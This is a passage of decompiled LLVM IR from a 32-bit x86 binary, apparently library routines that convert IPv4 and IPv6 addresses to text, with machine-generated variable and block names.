  store i32 %v1_80569c0, i32* @ecx, align 4
  %v1_80569c5 = trunc i16 %tmp37 to i8
  %v2_80569c5 = or i8 %v1_80569c5, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v12_80569c5 = zext i8 %v2_80569c5 to i32
  store i32 %v12_80569c5, i32* %eax.global-to-local, align 4
  %v4_80569c7 = add i32 %v0_8056972, 44
  %v5_80569c7 = add i32 %v4_80569c7, %v0_805697b
  %v6_80569c7 = inttoptr i32 %v5_80569c7 to i8*
  store i8 %v2_80569c5, i8* %v6_80569c7, align 1
  br label %dec_label_pc_80569cb

dec_label_pc_80569cb:                             ; preds = %dec_label_pc_8056982, %dec_label_pc_80569a2, %dec_label_pc_80569a8
  %v0_80569cb = load i32, i32* %ebp.global-to-local, align 4
  %v1_80569cb = inttoptr i32 %v0_80569cb to i8*
  %v2_80569cb = load i8, i8* %v1_80569cb, align 1
  %v3_80569cb = zext i8 %v2_80569cb to i32
  store i32 %v3_80569cb, i32* %eax.global-to-local, align 4
  %v0_80569d4 = load i32, i32* @esi, align 4
  %v1_80569d4 = add i32 %v0_80569d4, 1
  store i32 %v1_80569d4, i32* @esi, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_80569d9 = load i32, i32* @esp, align 4
  %v1_80569d9 = load i32, i32* @ecx, align 4
  %v2_80569d9 = add i32 %v0_80569d9, 44
  %v3_80569d9 = add i32 %v2_80569d9, %v1_80569d9
  %v4_80569d9 = inttoptr i32 %v3_80569d9 to i8*
  store i8 46, i8* %v4_80569d9, align 1
  %v0_80569de = load i32, i32* @ecx, align 4
  %v1_80569de = add i32 %v0_80569de, 2
  store i32 %v1_80569de, i32* %edi.global-to-local, align 4
  %v0_80569e1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80569e1 = load i32, i32* %eax.global-to-local, align 4
  %v2_80569e1 = zext i32 %v1_80569e1 to i64
  %v3_80569e1 = load i32, i32* %edx.global-to-local, align 4
  %v4_80569e1 = zext i32 %v3_80569e1 to i64
  %v5_80569e1 = mul nuw i64 %v4_80569e1, 4294967296
  %v6_80569e1 = or i64 %v5_80569e1, %v2_80569e1
  %v7_80569e1 = zext i32 %v0_80569e1 to i64
  %v8_80569e1 = udiv i64 %v6_80569e1, %v7_80569e1
  %v9_80569e1 = trunc i64 %v8_80569e1 to i32
  %v10_80569e1 = urem i64 %v6_80569e1, %v7_80569e1
  %v11_80569e1 = trunc i64 %v10_80569e1 to i32
  store i32 %v11_80569e1, i32* @edx, align 4
  %v3_80569e3 = and i32 %v9_80569e1, -256
  %v1_80569e5 = trunc i64 %v10_80569e1 to i8
  %v2_80569e5 = add i8 %v1_80569e5, 48
  %v12_80569e5 = zext i8 %v2_80569e5 to i32
  %v15_80569e5 = or i32 %v12_80569e5, %v3_80569e3
  store i32 %v15_80569e5, i32* %eax.global-to-local, align 4
  %v2_80569e7 = load i32, i32* @esp, align 4
  %v4_80569e7 = add i32 %v0_80569de, 43
  %v5_80569e7 = add i32 %v4_80569e7, %v2_80569e7
  %v6_80569e7 = inttoptr i32 %v5_80569e7 to i8*
  store i8 %v2_80569e5, i8* %v6_80569e7, align 1
  %v0_80569eb = load i32, i32* @esi, align 4
  %v10_80569eb = icmp eq i32 %v0_80569eb, 3
  store i1 %v10_80569eb, i1* %zf.global-to-local, align 1
  %v7_80569ee = icmp sgt i32 %v0_80569eb, 3
  %v1_80569f4.pre = load i32, i32* %edi.global-to-local, align 4
  br i1 %v7_80569ee, label %dec_label_pc_80569f4, label %dec_label_pc_8056958

dec_label_pc_80569f4:                             ; preds = %dec_label_pc_80569cb, %dec_label_pc_8056924
  %v1_80569f4 = phi i32 [ 0, %dec_label_pc_8056924 ], [ %v1_80569f4.pre, %dec_label_pc_80569cb ]
  %v0_80569f4 = load i32, i32* @esp, align 4
  %v2_80569f4 = add i32 %v0_80569f4, 42
  %v3_80569f4 = add i32 %v2_80569f4, %v1_80569f4
  %v4_80569f4 = inttoptr i32 %v3_80569f4 to i8*
  store i8 0, i8* %v4_80569f4, align 1
  %v0_80569f9 = load i32, i32* @esp, align 4
  %v9_80569f9 = icmp eq i32 %v0_80569f9, 12
  store i1 %v9_80569f9, i1* %zf.global-to-local, align 1
  %v2_80569fc = ptrtoint i32* %stack_var_-33 to i32
  store i32 %v2_80569fc, i32* @edi, align 4
  store i32 %v2_80569fc, i32* %stack_var_-92, align 4
  %v1_8056a01 = bitcast i32* %stack_var_-33 to i8*
  %v2_8056a01 = call i32 @function_8051ef8(i8* %v1_8056a01)
  store i32 %v2_8056a01, i32* @eax, align 4
  %v15_8056a09 = icmp eq i32 %v2_8056a01, %v0_8056940
  store i1 %v15_8056a09, i1* %zf.global-to-local, align 1
  %tmp38 = icmp ugt i32 %v2_8056a01, %v0_8056940
  br i1 %tmp38, label %dec_label_pc_8056a0f, label %dec_label_pc_8056a1e

dec_label_pc_8056a0f:                             ; preds = %dec_label_pc_80569f4
  %v0_8056a0f = load i32, i32* %stack_var_-92, align 4
  %v1_8056a0f = call i32 @function_8050f90(i32 %v0_8056a0f)
  %v1_8056a14 = inttoptr i32 %v1_8056a0f to i32*
  store i32 28, i32* %v1_8056a14, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8056a2d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056a2d

dec_label_pc_8056a1e:                             ; preds = %dec_label_pc_80569f4
  store i32 %v0_805693c, i32* %stack_var_-92, align 4
  %v2_8056a25 = inttoptr i32 %v0_805693c to i8*
  %v3_8056a25 = call i32 @function_8051edc(i8* %v2_8056a25, i32 %v2_80569fc)
  store i32 %v3_8056a25, i32* %eax.global-to-local, align 4
  %v0_8056a2a = load i32, i32* @esp, align 4
  %v6_8056a2a = icmp eq i32 %v0_8056a2a, -16
  store i1 %v6_8056a2a, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8056a2d

dec_label_pc_8056a2d:                             ; preds = %dec_label_pc_8056a0f, %dec_label_pc_8056a1e
  %v0_8056a34 = phi i32 [ 0, %dec_label_pc_8056a0f ], [ %v3_8056a25, %dec_label_pc_8056a1e ]
  %v0_8056a2d = phi i32 [ %v0_8056a2d.pre, %dec_label_pc_8056a0f ], [ %v15_805692a, %dec_label_pc_8056a1e ]
  %v9_8056a2d = icmp eq i32 %v0_8056a2d, -60
  store i1 %v9_8056a2d, i1* %zf.global-to-local, align 1
  store i32 %v0_8056926, i32* @esi, align 4
  store i32 %v0_8056925, i32* @edi, align 4
  ret i32 %v0_8056a34

; uselistorder directives
  uselistorder i32 %v0_80569eb, { 2, 0, 1 }
  uselistorder i8 %v2_80569c5, { 1, 0 }
  uselistorder i32 %v0_80569aa, { 1, 0 }
  uselistorder i1 %v11_805697b, { 1, 0 }
  uselistorder i32 %v1_8056972, { 1, 0 }
  uselistorder i32 %v5_8056960, { 1, 0 }
  uselistorder i32 %v0_80569eb24, { 1, 2, 0 }
  uselistorder i32 %v0_805693c, { 1, 0 }
  uselistorder i32* %stack_var_-33, { 0, 2, 1 }
  uselistorder i32* %stack_var_-92, { 1, 0, 2 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12 }
  uselistorder i32 -16, { 0, 1, 18, 19, 20, 9, 11, 12, 8, 10, 3, 13, 7, 14, 15, 16, 17, 21, 31, 32, 4, 26, 22, 5, 23, 24, 25, 27, 28, 6, 29, 30, 2 }
  uselistorder i32 42, { 2, 1, 0 }
  uselistorder i16 10, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 43, { 3, 4, 5, 1, 2, 0 }
  uselistorder i8 48, { 11, 7, 8, 0, 9, 12, 13, 1, 10, 2, 4, 5, 3, 6, 14 }
  uselistorder i8 100, { 1, 2, 0 }
  uselistorder i1* @df, { 4, 11, 12, 0, 1, 15, 16, 7, 2, 3, 13, 14, 5, 6, 8, 9, 10 }
  uselistorder label %dec_label_pc_8056a2d, { 1, 0 }
  uselistorder label %dec_label_pc_80569cb, { 2, 1, 0 }
}

define i32 @function_8056a35(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8056a35:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_8056a36 = load i32, i32* @edi, align 4
  %v0_8056a37 = load i32, i32* @esi, align 4
  %v0_8056a38 = load i32, i32* @ebx, align 4
  %v15_8056a39 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_8056a40 = icmp eq i32 %arg1, 2
  br i1 %v9_8056a40, label %dec_label_pc_8056a50, label %dec_label_pc_8056a45

dec_label_pc_8056a45:                             ; preds = %dec_label_pc_8056a35
  %v9_8056a45 = icmp eq i32 %arg1, 10
  %v1_8056a48 = icmp eq i1 %v9_8056a45, false
  br i1 %v1_8056a48, label %dec_label_pc_8056bef, label %dec_label_pc_8056a68

dec_label_pc_8056a50:                             ; preds = %dec_label_pc_8056a35
  store i32 %arg3, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_8056a5c = call i32 @function_8056924(i32 %v0_8056a38, i32 %v0_8056a37, i32 %v0_8056a36)
  store i32 %v3_8056a5c, i32* %eax.global-to-local, align 4
  store i32 %v3_8056a5c, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056bfc

dec_label_pc_8056a68:                             ; preds = %dec_label_pc_8056a45
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_8056a6d = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8056a6d, i32* %eax.global-to-local, align 4
  store i32 %v2_8056a6d, i32* %stack_var_-124, align 4
  %v4_8056a72 = bitcast i32* %stack_var_-48 to i8*
  %v5_8056a72 = call i32 @function_8051e84(i8* %v4_8056a72, i32 0, i32 32)
  store i32 %v5_8056a72, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_8056a94 = add i32 %arg2, 1
  br label %dec_label_pc_8056a7e

dec_label_pc_8056a7e:                             ; preds = %dec_label_pc_8056a7e.dec_label_pc_8056a7e_crit_edge, %dec_label_pc_8056a68
  %v1_8056aa1 = phi i32 [ %v15_8056a39, %dec_label_pc_8056a68 ], [ %v1_8056aa1.pre, %dec_label_pc_8056a7e.dec_label_pc_8056a7e_crit_edge ]
  %v0_8056a9965 = phi i32 [ 0, %dec_label_pc_8056a68 ], [ %v0_8056aa5.pre, %dec_label_pc_8056a7e.dec_label_pc_8056a7e_crit_edge ]
  %v1_8056a87 = ashr i32 %v0_8056a9965, 31
  %v2_8056a88 = zext i32 %v0_8056a9965 to i64
  %v4_8056a88 = zext i32 %v1_8056a87 to i64
  %v5_8056a88 = mul nuw i64 %v4_8056a88, 4294967296
  %v6_8056a88 = or i64 %v5_8056a88, %v2_8056a88
  %v8_8056a88 = sdiv i64 %v6_8056a88, 2
  %v9_8056a88 = trunc i64 %v8_8056a88 to i32
  store i32 %v9_8056a88, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_8056a88, i32* %ebx.global-to-local, align 4
  %v2_8056a90 = add i32 %v0_8056a9965, %arg2
  %v3_8056a90 = inttoptr i32 %v2_8056a90 to i8*
  %v4_8056a90 = load i8, i8* %v3_8056a90, align 1
  %v5_8056a90 = zext i8 %v4_8056a90 to i32
  store i32 %v5_8056a90, i32* %eax.global-to-local, align 4
  %v3_8056a94 = add i32 %v2_8056a94, %v0_8056a9965
  %v4_8056a94 = inttoptr i32 %v3_8056a94 to i8*
  %v5_8056a94 = load i8, i8* %v4_8056a94, align 1
  %v6_8056a94 = zext i8 %v5_8056a94 to i32
  store i32 %v6_8056a94, i32* %edx.global-to-local, align 4
  %v1_8056a99 = add i32 %v0_8056a9965, 2
  store i32 %v1_8056a99, i32* %ecx.global-to-local, align 4
  %v2_8056a9c = mul nuw nsw i32 %v5_8056a90, 256
  %v2_8056a9f = or i32 %v6_8056a94, %v2_8056a9c
  store i32 %v2_8056a9f, i32* %eax.global-to-local, align 4
  %v3_8056aa1 = mul i32 %v9_8056a88, 4
  %v4_8056aa1 = add i32 %v3_8056aa1, 60
  %v5_8056aa1 = add i32 %v4_8056aa1, %v1_8056aa1
  %v6_8056aa1 = inttoptr i32 %v5_8056aa1 to i32*
  store i32 %v2_8056a9f, i32* %v6_8056aa1, align 4
  %v0_8056aa5.pre = load i32, i32* %ecx.global-to-local, align 4
  %v7_8056aa8 = icmp sgt i32 %v0_8056aa5.pre, 15
  br i1 %v7_8056aa8, label %dec_label_pc_8056aaa, label %dec_label_pc_8056a7e.dec_label_pc_8056a7e_crit_edge

dec_label_pc_8056a7e.dec_label_pc_8056a7e_crit_edge: ; preds = %dec_label_pc_8056a7e
  %v1_8056aa1.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056a7e

dec_label_pc_8056aaa:                             ; preds = %dec_label_pc_8056a7e
  %v4_8056a68 = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8056ab4.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056ab4

dec_label_pc_8056ab4:                             ; preds = %dec_label_pc_8056aaa, %dec_label_pc_8056ae1
  %v0_8056ae164 = phi i32 [ 0, %dec_label_pc_8056aaa ], [ %v1_8056ae1, %dec_label_pc_8056ae1 ]
  %v0_8056acc63 = phi i32 [ -1, %dec_label_pc_8056aaa ], [ %v0_8056acc7, %dec_label_pc_8056ae1 ]
  %v0_8056aec62 = phi i32 [ -1, %dec_label_pc_8056aaa ], [ %v0_8056ad18, %dec_label_pc_8056ae1 ]
  %v0_8056af761 = phi i32 [ -1, %dec_label_pc_8056aaa ], [ %v0_8056adc12, %dec_label_pc_8056ae1 ]
  %v2_8056ab4 = mul nuw nsw i32 %v0_8056ae164, 4
  %v3_8056ab4 = add nuw nsw i32 %v2_8056ab4, 60
  %v4_8056ab4 = add i32 %v3_8056ab4, %v0_8056ab4.pre
  %v5_8056ab4 = inttoptr i32 %v4_8056ab4 to i32*
  %v6_8056ab4 = load i32, i32* %v5_8056ab4, align 4
  %v7_8056ab4 = icmp eq i32 %v6_8056ab4, 0
  %v1_8056ab9 = icmp eq i1 %v7_8056ab4, false
  %v10_8056acc = icmp eq i32 %v0_8056acc63, -1
  br i1 %v1_8056ab9, label %dec_label_pc_8056acc, label %dec_label_pc_8056abb

dec_label_pc_8056abb:                             ; preds = %dec_label_pc_8056ab4
  %v1_8056abe = icmp eq i1 %v10_8056acc, false
  br i1 %v1_8056abe, label %dec_label_pc_8056ac9, label %dec_label_pc_8056ac0

dec_label_pc_8056ac0:                             ; preds = %dec_label_pc_8056abb
  store i32 %v0_8056ae164, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056ae1

dec_label_pc_8056ac9:                             ; preds = %dec_label_pc_8056abb
  %v0_8056ac9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056ac9 = add i32 %v0_8056ac9, 1
  store i32 %v1_8056ac9, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056ae1

dec_label_pc_8056acc:                             ; preds = %dec_label_pc_8056ab4
  br i1 %v10_8056acc, label %dec_label_pc_8056ae1, label %dec_label_pc_8056ad1

dec_label_pc_8056ad1:                             ; preds = %dec_label_pc_8056acc
  %v10_8056ad1 = icmp eq i32 %v0_8056aec62, -1
  %v0_8056ada.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056ad6 = load i32, i32* @ebp, align 4
  %v7_8056ad8 = icmp sgt i32 %v0_8056ada.pre, %v1_8056ad6
  %or.cond = or i1 %v10_8056ad1, %v7_8056ad8
  br i1 %or.cond, label %dec_label_pc_8056ada, label %dec_label_pc_8056ade

dec_label_pc_8056ada:                             ; preds = %dec_label_pc_8056ad1
  store i32 %v0_8056ada.pre, i32* @ebp, align 4
  store i32 %v0_8056af761, i32* @edi, align 4
  br label %dec_label_pc_8056ade

dec_label_pc_8056ade:                             ; preds = %dec_label_pc_8056ad1, %dec_label_pc_8056ada
  %v0_8056ad110 = phi i32 [ %v0_8056af761, %dec_label_pc_8056ada ], [ %v0_8056aec62, %dec_label_pc_8056ad1 ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056ae1

dec_label_pc_8056ae1:                             ; preds = %dec_label_pc_8056acc, %dec_label_pc_8056ac9, %dec_label_pc_8056ac0, %dec_label_pc_8056ade
  %v0_8056adc12 = phi i32 [ %v0_8056af761, %dec_label_pc_8056acc ], [ %v0_8056af761, %dec_label_pc_8056ac9 ], [ %v0_8056ae164, %dec_label_pc_8056ac0 ], [ -1, %dec_label_pc_8056ade ]
  %v0_8056acc7 = phi i32 [ -1, %dec_label_pc_8056acc ], [ %v0_8056acc63, %dec_label_pc_8056ac9 ], [ %v0_8056ae164, %dec_label_pc_8056ac0 ], [ -1, %dec_label_pc_8056ade ]
  %v0_8056ad18 = phi i32 [ %v0_8056aec62, %dec_label_pc_8056acc ], [ %v0_8056aec62, %dec_label_pc_8056ac9 ], [ %v0_8056aec62, %dec_label_pc_8056ac0 ], [ %v0_8056ad110, %dec_label_pc_8056ade ]
  %v1_8056ae1 = add nuw nsw i32 %v0_8056ae164, 1
  store i32 %v1_8056ae1, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_8056ae1, 8
  br i1 %exitcond, label %dec_label_pc_8056ae7, label %dec_label_pc_8056ab4

dec_label_pc_8056ae7:                             ; preds = %dec_label_pc_8056ae1
  %v10_8056ae7 = icmp eq i32 %v0_8056adc12, -1
  br i1 %v10_8056ae7, label %dec_label_pc_8056af9, label %dec_label_pc_8056aec

dec_label_pc_8056aec:                             ; preds = %dec_label_pc_8056ae7
  %v10_8056aec = icmp eq i32 %v0_8056ad18, -1
  %v0_8056af5.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_8056aec, label %dec_label_pc_8056af5, label %dec_label_pc_8056af1

dec_label_pc_8056af1:                             ; preds = %dec_label_pc_8056aec
  %v1_8056af1 = load i32, i32* @ebp, align 4
  %v7_8056af3 = icmp sgt i32 %v0_8056af5.pre, %v1_8056af1
  br i1 %v7_8056af3, label %dec_label_pc_8056af5, label %dec_label_pc_8056af9

dec_label_pc_8056af5:                             ; preds = %dec_label_pc_8056aec, %dec_label_pc_8056af1
  store i32 %v0_8056af5.pre, i32* @ebp, align 4
  store i32 %v0_8056adc12, i32* @edi, align 4
  br label %dec_label_pc_8056af9

dec_label_pc_8056af9:                             ; preds = %dec_label_pc_8056af1, %dec_label_pc_8056ae7, %dec_label_pc_8056af5
  %v5_8056b06 = phi i32 [ %v0_8056ad18, %dec_label_pc_8056af1 ], [ %v0_8056ad18, %dec_label_pc_8056ae7 ], [ %v0_8056adc12, %dec_label_pc_8056af5 ]
  %v10_8056af9 = icmp eq i32 %v5_8056b06, -1
  br i1 %v10_8056af9, label %dec_label_pc_8056b09, label %dec_label_pc_8056afe

dec_label_pc_8056afe:                             ; preds = %dec_label_pc_8056af9
  %v0_8056afe = load i32, i32* @ebp, align 4
  %v1_8056afe = add i32 %v0_8056afe, -1
  %v6_8056afe = sub i32 0, %v0_8056afe
  %v7_8056afe = and i32 %v0_8056afe, %v6_8056afe
  %v8_8056afe = icmp slt i32 %v7_8056afe, 0
  %v9_8056afe = icmp eq i32 %v1_8056afe, 0
  %v10_8056afe = icmp slt i32 %v1_8056afe, 0
  store i32 -1, i32* %eax.global-to-local, align 4
  %v3_8056b06 = icmp ne i1 %v10_8056afe, %v8_8056afe
  %v4_8056b06 = or i1 %v9_8056afe, %v3_8056b06
  %v7_8056b06 = select i1 %v4_8056b06, i32 -1, i32 %v5_8056b06
  store i32 %v7_8056b06, i32* @edi, align 4
  br label %dec_label_pc_8056b09

dec_label_pc_8056b09:                             ; preds = %dec_label_pc_8056af9, %dec_label_pc_8056afe
  %v0_8056ba917 = phi i32 [ %v5_8056b06, %dec_label_pc_8056af9 ], [ %v7_8056b06, %dec_label_pc_8056afe ]
  %v2_8056b09 = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_8056b09, i32* @ebx, align 4
  %v3_8056b8b = add i32 %v4_8056a68, 64
  %v12_8056b49 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_8056ba953 = icmp eq i32 %v0_8056ba917, -1
  %v1_8056b51 = icmp eq i1 %v12_8056b49, false
  br label %dec_label_pc_8056b14

dec_label_pc_8056b14:                             ; preds = %dec_label_pc_8056b09, %dec_label_pc_8056b9f
  %v10_8056ba960 = phi i1 [ %v10_8056ba953, %dec_label_pc_8056b09 ], [ %v10_8056ba9, %dec_label_pc_8056b9f ]
  %v0_8056b2e59 = phi i32 [ 0, %dec_label_pc_8056b09 ], [ %v1_8056b9f, %dec_label_pc_8056b9f ]
  %v1_8056b2458 = phi i32 [ %v0_8056ba917, %dec_label_pc_8056b09 ], [ %v0_8056ba9.pre, %dec_label_pc_8056b9f ]
  %v0_8056b3257 = phi i32 [ %v2_8056b09, %dec_label_pc_8056b09 ], [ %v0_8056b2818, %dec_label_pc_8056b9f ]
  %stack_var_-120.156 = phi i8* [ null, %dec_label_pc_8056b09 ], [ %stack_var_-120.0, %dec_label_pc_8056b9f ]
  %stack_var_-116.155 = phi i32 [ 32, %dec_label_pc_8056b09 ], [ %stack_var_-116.0, %dec_label_pc_8056b9f ]
  br i1 %v10_8056ba960, label %dec_label_pc_8056b2e, label %dec_label_pc_8056b19

dec_label_pc_8056b19:                             ; preds = %dec_label_pc_8056b14
  %v2_8056b19 = sub i32 %v0_8056b2e59, %v1_8056b2458
  %v8_8056b19 = xor i32 %v0_8056b2e59, %v1_8056b2458
  %v9_8056b19 = xor i32 %v2_8056b19, %v0_8056b2e59
  %v10_8056b19 = and i32 %v9_8056b19, %v8_8056b19
  %v11_8056b19 = icmp slt i32 %v10_8056b19, 0
  %v12_8056b19 = icmp eq i32 %v2_8056b19, 0
  %v13_8056b19 = icmp slt i32 %v2_8056b19, 0
  %v2_8056b1b = icmp eq i1 %v13_8056b19, %v11_8056b19
  br i1 %v2_8056b1b, label %dec_label_pc_8056b1d, label %dec_label_pc_8056b2e

dec_label_pc_8056b1d:                             ; preds = %dec_label_pc_8056b19
  %v1_8056b1d = load i32, i32* @ebp, align 4
  %v2_8056b1d = add i32 %v1_8056b1d, %v1_8056b2458
  store i32 %v2_8056b1d, i32* %eax.global-to-local, align 4
  %v2_8056b20 = sub i32 %v0_8056b2e59, %v2_8056b1d
  %v8_8056b20 = xor i32 %v2_8056b1d, %v0_8056b2e59
  %v9_8056b20 = xor i32 %v2_8056b20, %v0_8056b2e59
  %v10_8056b20 = and i32 %v9_8056b20, %v8_8056b20
  %v11_8056b20 = icmp slt i32 %v10_8056b20, 0
  %v13_8056b20 = icmp slt i32 %v2_8056b20, 0
  %v2_8056b22 = icmp eq i1 %v13_8056b20, %v11_8056b20
  br i1 %v2_8056b22, label %dec_label_pc_8056b2e, label %dec_label_pc_8056b24

dec_label_pc_8056b24:                             ; preds = %dec_label_pc_8056b1d
  %v1_8056b26 = icmp eq i1 %v12_8056b19, false
  br i1 %v1_8056b26, label %dec_label_pc_8056b9f, label %dec_label_pc_8056b28

dec_label_pc_8056b28:                             ; preds = %dec_label_pc_8056b24
  %v1_8056b28 = inttoptr i32 %v0_8056b3257 to i8*
  store i8 58, i8* %v1_8056b28, align 1
  %v0_8056b2b = load i32, i32* @ebx, align 4
  %v1_8056b2b = add i32 %v0_8056b2b, 1
  store i32 %v1_8056b2b, i32* @ebx, align 4
  br label %dec_label_pc_8056b9f

dec_label_pc_8056b2e:                             ; preds = %dec_label_pc_8056b19, %dec_label_pc_8056b1d, %dec_label_pc_8056b14
  %v1_8056b2e = icmp eq i32 %v0_8056b2e59, 0
  br i1 %v1_8056b2e, label %dec_label_pc_8056b36, label %dec_label_pc_8056b32

dec_label_pc_8056b32:                             ; preds = %dec_label_pc_8056b2e
  %v1_8056b32 = inttoptr i32 %v0_8056b3257 to i8*
  store i8 58, i8* %v1_8056b32, align 1
  %v0_8056b35 = load i32, i32* @ebx, align 4
  %v1_8056b35 = add i32 %v0_8056b35, 1
  store i32 %v1_8056b35, i32* @ebx, align 4
  %v0_8056b36.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8056b36

dec_label_pc_8056b36:                             ; preds = %dec_label_pc_8056b2e, %dec_label_pc_8056b32
  %v0_8056b94 = phi i32 [ %v0_8056b3257, %dec_label_pc_8056b2e ], [ %v1_8056b35, %dec_label_pc_8056b32 ]
  %v1_8056b8b = phi i32 [ 0, %dec_label_pc_8056b2e ], [ %v0_8056b36.pre, %dec_label_pc_8056b32 ]
  %v9_8056b36 = icmp eq i32 %v1_8056b8b, 6
  %v1_8056b39 = icmp eq i1 %v9_8056b36, false
  br i1 %v1_8056b39, label %dec_label_pc_8056b8a, label %dec_label_pc_8056b3b

dec_label_pc_8056b3b:                             ; preds = %dec_label_pc_8056b36
  %v0_8056b3b = load i32, i32* @edi, align 4
  %v1_8056b3b = icmp eq i32 %v0_8056b3b, 0
  %v1_8056b3d = icmp eq i1 %v1_8056b3b, false
  br i1 %v1_8056b3d, label %dec_label_pc_8056b8a, label %dec_label_pc_8056b3f

dec_label_pc_8056b3f:                             ; preds = %dec_label_pc_8056b3b
  %v0_8056b3f = load i32, i32* @ebp, align 4
  %v9_8056b3f = icmp eq i32 %v0_8056b3f, 6
  br i1 %v9_8056b3f, label %dec_label_pc_8056b53, label %dec_label_pc_8056b44

dec_label_pc_8056b44:                             ; preds = %dec_label_pc_8056b3f
  %v9_8056b44 = icmp eq i32 %v0_8056b3f, 5
  %v1_8056b47 = icmp eq i1 %v9_8056b44, false
  br i1 %v1_8056b47, label %dec_label_pc_8056b8a, label %dec_label_pc_8056b49

dec_label_pc_8056b49:                             ; preds = %dec_label_pc_8056b44
  br i1 %v1_8056b51, label %dec_label_pc_8056b8a, label %dec_label_pc_8056b53

dec_label_pc_8056b53:                             ; preds = %dec_label_pc_8056b49, %dec_label_pc_8056b3f
  %v2_8056b59 = sub i32 %v0_8056b94, %v2_8056b09
  store i32 %v2_8056b59, i32* @esi, align 4
  %v2_8056b64 = sub i32 46, %v2_8056b59
  store i32 %v2_8056b64, i32* @ecx, align 4
  store i32 %v0_8056b94, i32* @edx, align 4
  %v1_8056b68 = add i32 %arg2, 12
  store i32 %v1_8056b68, i32* @eax, align 4
  %v0_8056b6b = load i32, i32* %stack_var_-124, align 4
  %v2_8056b6b = ptrtoint i8* %stack_var_-120.156 to i32
  %v4_8056b6b = call i32 @function_8056924(i32 %v0_8056b6b, i32 %v2_8056b6b, i32 %stack_var_-116.155)
  store i32 %v4_8056b6b, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8056b72 = icmp eq i32 %v4_8056b6b, 0
  br i1 %v1_8056b72, label %dec_label_pc_8056bfc, label %dec_label_pc_8056b7a

dec_label_pc_8056b7a:                             ; preds = %dec_label_pc_8056b53
  %v0_8056b7d = load i32, i32* @ebx, align 4
  store i32 %v0_8056b7d, i32* %stack_var_-124, align 4
  %v1_8056b7e = inttoptr i32 %v0_8056b7d to i8*
  %v2_8056b7e = call i32 @function_8051ef8(i8* %v1_8056b7e)
  store i32 %v2_8056b7e, i32* %eax.global-to-local, align 4
  %v0_8056b86 = load i32, i32* @ebx, align 4
  %v3_8056b86 = add i32 %v0_8056b86, %v2_8056b7e
  store i32 %v3_8056b86, i32* @ebx, align 4
  %v0_8056bae.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8056bae

dec_label_pc_8056b8a:                             ; preds = %dec_label_pc_8056b49, %dec_label_pc_8056b44, %dec_label_pc_8056b3b, %dec_label_pc_8056b36
  %v0_8056b8a = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8056b8a, i32* %stack_var_-112, align 4
  %v2_8056b8b = mul i32 %v1_8056b8b, 4
  %v4_8056b8b = add i32 %v3_8056b8b, %v2_8056b8b
  %v5_8056b8b = inttoptr i32 %v4_8056b8b to i32*
  %v6_8056b8b = load i32, i32* %v5_8056b8b, align 4
  store i32 %v0_8056b94, i32* %stack_var_-124, align 4
  %v5_8056b95 = call i32 @function_8050f98(i32 %v0_8056b94, i32 ptrtoint ([3 x i8]* @global_var_805d431.418 to i32), i32 %v6_8056b8b, i32 %v0_8056b8a)
  store i32 %v5_8056b95, i32* %eax.global-to-local, align 4
  %v0_8056b9d = load i32, i32* @ebx, align 4
  %v2_8056b9d = add i32 %v0_8056b9d, %v5_8056b95
  store i32 %v2_8056b9d, i32* @ebx, align 4
  br label %dec_label_pc_8056b9f

dec_label_pc_8056b9f:                             ; preds = %dec_label_pc_8056b24, %dec_label_pc_8056b28, %dec_label_pc_8056b8a
  %stack_var_-116.0 = phi i32 [ %v6_8056b8b, %dec_label_pc_8056b8a ], [ %stack_var_-116.155, %dec_label_pc_8056b24 ], [ %stack_var_-116.155, %dec_label_pc_8056b28 ]
